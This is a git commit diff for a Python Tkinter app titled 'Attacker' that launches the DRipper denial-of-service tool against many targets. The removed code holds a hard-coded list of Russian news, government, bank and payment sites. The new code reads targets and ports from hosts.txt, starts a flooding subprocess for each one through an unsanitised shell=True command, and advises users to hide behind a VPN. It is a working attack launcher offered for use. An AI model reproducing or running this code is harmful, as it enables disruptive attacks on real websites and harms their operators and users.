e103a9c4bcbc5bc6ad783d35f0a3098b1355b695
Anton Borodyuk <ANTONBORODA@users.noreply.github.com>
2022-03-06 15:04:54 +0200

    Minor QoL improvements
    Added "hosts.txt" that now has the hosts to attack
    Added support for IPs in hosts
    Added support for port in hosts
    Subprocesses will now be killed when "stop" is pressed

--- app.py
+++ app.py
@@ -1,166 +1,41 @@
 #!/usr/bin/python3
 import os
-import tkinter as tk
-import subprocess, shlex
-import threading
-import dns.resolver
-import random
 import pathlib
+import random
+import subprocess
+import tkinter as tk
+
+import dns.resolver
 
 os.environ["PYTHONUNBUFFERED"] = "1"
 
-d={
-	"https://lenta.ru/": {
-		"number_of_requests": 571,
-		"number_of_errored_responses": 0
-	},
-	"https://auth.ria.ru/": {
-		"number_of_requests": 70,
-		"number_of_errored_responses": 0
-	},
-	"https://ria.ru/": {
-		"number_of_requests": 70,
-		"number_of_errored_responses": 0
-	},
-	"https://ria.ru/lenta/": {
-		"number_of_requests": 70,
-		"number_of_errored_responses": 0
-	},
-	"https://www.rbc.ru/": {
-		"number_of_requests": 65,
-		"number_of_errored_responses": 0
-	},
-	"https://www.rt.com/": {
-		"number_of_requests": 67,
-		"number_of_errored_responses": 0
-	},
-	"http://kremlin.ru/": {
-		"number_of_requests": 73,
-		"number_of_errored_responses": 73,
-		"error_message": "Failed to fetch"
-	},
-	"http://en.kremlin.ru/": {
-		"number_of_requests": 68,
-		"number_of_errored_responses": 68,
-		"error_message": "Failed to fetch"
-	},
-	"https://smotrim.ru/": {
-		"number_of_requests": 69,
-		"number_of_errored_responses": 0
-	},
-	"https://tass.ru/": {
-		"number_of_requests": 65,
-		"number_of_errored_responses": 0
-	},
-	"https://tvzvezda.ru/": {
-		"number_of_requests": 63,
-		"number_of_errored_responses": 0
-	},
-	"https://rbc.ru/": {
-		"number_of_requests": 61,
-		"number_of_errored_responses": 0
-	},
-	"https://minzdrav.gov.ru/": {
-		"number_of_requests": 60,
-		"number_of_errored_responses": 0
-	},
-	"http://government.ru/": {
-		"number_of_requests": 66,
-		"number_of_errored_responses": 66,
-		"error_message": "Failed to fetch"
-	},
-	"https://www.mchs.gov.ru/": {
-		"number_of_requests": 59,
-		"number_of_errored_responses": 2,
-		"error_message": "Failed to fetch"
-	},
-	"https://rkn.gov.ru/": {
-		"number_of_requests": 65,
-		"number_of_errored_responses": 0
-	},
-	"http://www.council.gov.ru/": {
-		"number_of_requests": 68,
-		"number_of_errored_responses": 68,
-		"error_message": "Failed to fetch"
-	},
-	"https://www.sberbank.ru/en/individualclients": {
-		"number_of_requests": 66,
-		"number_of_errored_responses": 0
-	},
-	"https://kassa.yandex.ru/main-new": {
-		"number_of_requests": 61,
-		"number_of_errored_responses": 3,
-		"error_message": "Not Found"
-	},
-	"http://www.gosuslugi.ru/ru/": {
-		"number_of_requests": 67,
-		"number_of_errored_responses": 67,
-		"error_message": "Failed to fetch"
-	},
-	"https://www.donland.ru/": {
-		"number_of_requests": 63,
-		"number_of_errored_responses": 2,
-		"error_message": "Failed to fetch"
-	}
-}
 
-
-
-OptionList = [
-"tk-union.tv",
-"republic-tv.ru",
-"dnronline.su",
-"dnr-news.com",
-"gorod-donetsk.com",
-"vsednr.ru",
-"mininfodnr.ru",
-"tk-union.tv",
-"inosmi.ru",
-"www.the-american-interest.com",
-"miaistok.su",
-"lug-info.com",
-"www.rt.com",
-"sputniknews.com",
-"tass.ru",
-"ruptly.tv",
-"tvzvezda.ru",
-"www.cbr.ru",
-"www.kremlin.ru",
-"www.vesti.ru",
-"www.smotrim.ru",
-"www.vgtrk.ru",
-"www.politnavigator.net",
-"ukraina.ru",
-
-] 
-
-f = [i.replace('https://', '').replace('http://', '').replace('/', '') for i in list(d.keys())]
-OptionList.extend(f)
-OptionList=list(set(OptionList))
+def is_ip4(s):
+    pieces = s.split('.')
+    if len(pieces) != 4: return False
+    try:
+        return all(0 <= int(p) < 256 for p in pieces)
+    except ValueError:
+        return False
 
 
 def get_ip(host):
-	try:
-		resolver = dns.resolver.Resolver()
-		ips = list(resolver.query(host, 'A'))
-		ip = random.choice(ips)
-	except:
-		ip = '255.255.255.255'
-		return ip
-	return ip.to_text()
+    if is_ip4(host):
+        return host
+    try:
+        resolver = dns.resolver.Resolver()
+        ips = list(resolver.resolve(host, 'A'))
+        ip = random.choice(ips)
+    except:
+        ip = '255.255.255.255'
+        return ip
+    return ip.to_text()
 
 
+processes = []
 app = tk.Tk()
-app.title("Attacker")
-
+app.title("Attacker mod by BORODA")
 app.geometry('300x300')
-
-# host= tk.StringVar(app)
-# host.set(OptionList[0])
-
-# opt = tk.OptionMenu(app, host, *OptionList)
-# opt.config(width=90, font=('Helvetica', 12))
-# opt.pack()
 
 message = tk.StringVar(app)
 label = tk.Label(app, textvariable=message)
@@ -168,46 +43,46 @@ label.pack()
 
 message.set("Better use vpn before running this app")
 
-text = tk.Text(app, height=5, width=152)
+hosts = open("hosts.txt", "r")
+data = hosts.read()
+hosts.close()
+
+text = tk.Text(app, height=17, width=152)
+text.insert(1.0, data)
 
 proc = None
 
 
-def a(ip):
-	cmd = f'python3 DRipper.py -s {ip} -t 135 -p 443'
-	with subprocess.Popen(shlex.split(cmd), stdout=subprocess.PIPE) as process:
-		while True:
-			output = process.communicate()[0].decode() # "utf-8")
-			print(output)
-			text.insert('1.0', output)
-
-	# t = threading.Thread(target=subprocess.Popen, args=(shlex.split(cmd),), daemon=True)
-	
-
-
 def start():
-	for hostText in OptionList:
-		ip = get_ip(hostText)
-		if ip != '255.255.255.255':
-			# message.set(f"Attacking {hostText} ({ip})")
-			current = pathlib.Path(__file__).parent.resolve()
-			os.chdir(current)
-			cmd = f'python3 DRipper.py -s {ip} -t 135 -p 443'
-			# threading.Thread(target=a, args=(ip, ), daemon=True).start()
-			threading.Thread(target=subprocess.Popen, args=(shlex.split(cmd),), daemon=True).start()
+    options_text = text.get(1.0, "end-1c")
+    for hostText in options_text.splitlines():
+        if not hostText:
+            continue
+        host = hostText.split(":")
+        ip = get_ip(host[0])
+        port = "443"
+        if len(host) > 1:
+            port = host[1]
+        if ip != '255.255.255.255':
+            current = pathlib.Path(__file__).parent.resolve()
+            os.chdir(current)
+            cmd = f'python3 DRipper.py --quiet -s {ip} -t 40 -p {port}'
+            sub = subprocess.Popen(cmd, shell=True)
+            processes.append(sub)
 
 
 def stop():
-	exit(0)
+    for sub in processes:
+        sub.kill()
+    exit(0)
 
 
-btn = tk.Button(app, text='Start', bd ='5', command=start)
-btn.pack(side = 'top')
+btn = tk.Button(app, text='Start', bd='5', command=start)
+btn.pack(side='top')
 
-btn = tk.Button(app, text='Stop', bd ='5', command=stop)
-btn.pack(side = 'top')
+btn = tk.Button(app, text='Stop', bd='5', command=stop)
+btn.pack(side='top')
 
 text.pack()
-
 
 app.mainloop()
